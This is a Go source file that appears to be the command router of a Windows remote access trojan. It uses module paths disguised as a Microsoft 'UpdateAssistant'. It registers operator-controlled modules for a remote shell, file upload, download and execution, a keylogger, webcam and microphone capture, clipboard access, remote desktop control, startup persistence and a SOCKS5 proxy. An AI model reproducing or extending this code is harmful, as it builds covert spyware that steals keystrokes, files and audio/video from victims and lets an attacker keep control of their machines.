//go:build windows

package apps

import (
	"encoding/json"

    "github.com/microsoft/UpdateAssistant/modules/apps/controlpanel"
    "github.com/microsoft/UpdateAssistant/modules/apps/fileexplorer"
    "github.com/microsoft/UpdateAssistant/modules/apps/keylog"
    "github.com/microsoft/UpdateAssistant/modules/apps/liveview"
    "github.com/microsoft/UpdateAssistant/modules/apps/persistence"
    "github.com/microsoft/UpdateAssistant/modules/apps/procs"
    appSocks5 "github.com/microsoft/UpdateAssistant/modules/apps/socks5"
    "github.com/microsoft/UpdateAssistant/modules/apps/system"
    "github.com/microsoft/UpdateAssistant/modules/apps/terminal"
    "github.com/microsoft/UpdateAssistant/modules/apps/webcam"
    "github.com/microsoft/UpdateAssistant/modules/ipc"
    "github.com/microsoft/UpdateAssistant/modules/sysutil"
    "github.com/microsoft/UpdateAssistant/modules/transport"
)

func Register(client *transport.Client, cmds *ipc.Commands) {
	tabs := NewTabs()

	tabs.DeclareApp("terminal")
	tabs.AddTab("terminal", "cmd", "CMD", func(_, _ string, _ json.RawMessage) {})
	tabs.AddTab("terminal", "ps", "PowerShell", func(_, _ string, _ json.RawMessage) {})
	RegisterApp("terminal", &App{
		Handle: func(_ *transport.Client, _ string, payload json.RawMessage) {
			terminal.Handle(client, payload)
			tabs.SendTabs(client, "terminal")
		},
	}, "terminal_exec")

	tabs.DeclareApp("fileexplorer")
	RegisterApp("fileexplorer", &App{
		Handle: func(_ *transport.Client, msgType string, payload json.RawMessage) {
			switch msgType {
			case "fs_open":
				fileexplorer.Open(client)
			case "fs_close":
				fileexplorer.Close()
			default:
				go fileexplorer.Handle(client, msgType, payload)
			}
		},
		Stop: fileexplorer.Close,
	}, "fs_open", "fs_close",
		"fs_list", "fs_read", "fs_delete", "fs_rename", "fs_copy",
		"fs_create", "fs_mkdir", "fs_download", "fs_upload",
		"fs_download_multi", "fs_toggle_hidden", "fs_search", "fs_write", "fs_run")

	tabs.DeclareApp("remotedesktop")
	RegisterApp("remotedesktop", &App{
		Handle: func(_ *transport.Client, msgType string, payload json.RawMessage) {
			switch msgType {
			case "liveview_start":
				var p struct {
					SessID string `json:"sess_id"`
				}
				if json.Unmarshal(payload, &p) == nil && p.SessID != "" {
					go func(id string) {
						defer func() { recover() }()
						liveview.Start(client, id)
					}(p.SessID)
				}
			case "liveview_stop":
				var p struct {
					SessID string `json:"sess_id"`
				}
				if json.Unmarshal(payload, &p) == nil && p.SessID != "" {
					go func(id string) {
						defer func() { recover() }()
						liveview.StopSession(id)
					}(p.SessID)
				}
			case "liveview_input":
				go func(pl json.RawMessage) {
					defer func() { recover() }()
					liveview.HandleInput(pl)
				}(payload)
			case "panel_open":
				controlpanel.Open(client)
			case "panel_close":
				controlpanel.Close()
			case "panel_action", "panel_get":
				controlpanel.Handle(client, msgType, payload)
			case "mic_start", "mic_stop", "mic_list":
				go func(mt string, pl json.RawMessage) {
					defer func() { recover() }()
					liveview.HandleMic(client, mt, pl)
				}(msgType, payload)
			}
		},
		Stop: func() {
			go func() {
				defer func() { recover() }()
				liveview.Stop()
			}()
		},
	}, "liveview_start", "liveview_stop", "liveview_input", "panel_open", "panel_close", "panel_action", "panel_get", "mic_start", "mic_stop", "mic_list")

	tabs.DeclareApp("taskmgr")
	RegisterApp("procs", &App{
		Handle: func(_ *transport.Client, msgType string, payload json.RawMessage) {
			procs.Handle(client, msgType, payload)
		},
	})

	tabs.DeclareApp("system")
	tabs.AddTab("system", "info", "Info", func(_, _ string, _ json.RawMessage) {})
	tabs.AddTab("system", "startup", "Startup", func(_, _ string, _ json.RawMessage) {})
	tabs.AddTab("system", "clipboard", "Clipboard", func(_, _ string, _ json.RawMessage) {})
	tabs.AddTab("system", "persistence", "Persistence", func(_, _ string, _ json.RawMessage) {})
	tabs.AddTab("system", "software", "Software", func(_, _ string, _ json.RawMessage) {})
	RegisterApp("system", &App{
		Handle: func(_ *transport.Client, msgType string, payload json.RawMessage) {
			switch msgType {
			case "system_open":
				system.Open(client)
				tabs.SendTabs(client, "system")
			case "system_close":
				StopApp("system")
			default:
				go system.Handle(client, msgType, payload)
			}
		},
		Stop: system.Close,
	}, "system_open", "system_close", "system_refresh", "system_export",
		"system_clipboard_get", "system_clipboard_set",
		"system_startup_list", "system_startup_add", "system_startup_remove",
		"system_software_list")

	tabs.DeclareApp("keylog")
	tabs.AddTab("keylog", "keys", "Keystrokes", func(_, _ string, _ json.RawMessage) {})
	RegisterApp("keylog", &App{
		Handle: func(_ *transport.Client, msgType string, payload json.RawMessage) {
			keylog.Handle(client, msgType, payload)
		},
		Stop: func() {
			sysutil.KeylogStop()
		},
	}, "keylog_open", "keylog_close", "keylog_refresh", "keylog_stop")

	tabs.DeclareApp("logs")
	tabs.DeclareApp("latency")
	tabs.DeclareApp("socks5")
	RegisterApp("socks5", &App{
		Handle: func(client *transport.Client, msgType string, payload json.RawMessage) {
			appSocks5.Handle(client, msgType, payload)
		},
	}, "socks5_start", "socks5_stop")
    RegisterApp("persistence", &App{
        Handle: func(_ *transport.Client, msgType string, payload json.RawMessage) {
            go persistence.Handle(client, msgType, payload)
        },
        Stop: func() {},
    }, "persistence_get", "persistence_toggle")

    tabs.DeclareApp("webcam")
    RegisterApp("webcam", &App{
        Handle: func(_ *transport.Client, msgType string, payload json.RawMessage) {
            webcam.Handle(client, msgType, payload)
        },
        Stop: webcam.Stop,
    }, "cam_start", "cam_stop", "cam_list")

	client.OnDisconnect(StopAll)
	tabs.SendApps(client)

	client.OnMessage(func(msgType string, payload json.RawMessage) {
		switch msgType {
		case "panel_apps_get":
			tabs.SendApps(client)
			return
		case "panel_tabs_get":
			tabs.HandleTabsGet(client, payload)
			return
		case "panel_tab_action":
			tabs.HandleTabAction(payload)
			return
		}
		// chat is special — needs cmds, not an app
		if msgType == "chat" {
			var m struct {
				Text        string   `json:"text"`
				Attachments []string `json:"attachments"`
				ReplyTo     string   `json:"reply_to"`
			}
			if json.Unmarshal(payload, &m) != nil {
				return
			}
			replyTo := m.ReplyTo
			cmds.Dispatch(m.Text, m.Attachments, func(text string, embed *ipc.Embed, attachments []string) error {
				return client.SendChat(replyTo, embed, text, attachments)
			})
			return
		}
		// route to registered app, fall back to procs
		if !Dispatch(client, msgType, payload) {
			procs.Handle(client, msgType, payload)
		}
	})
}
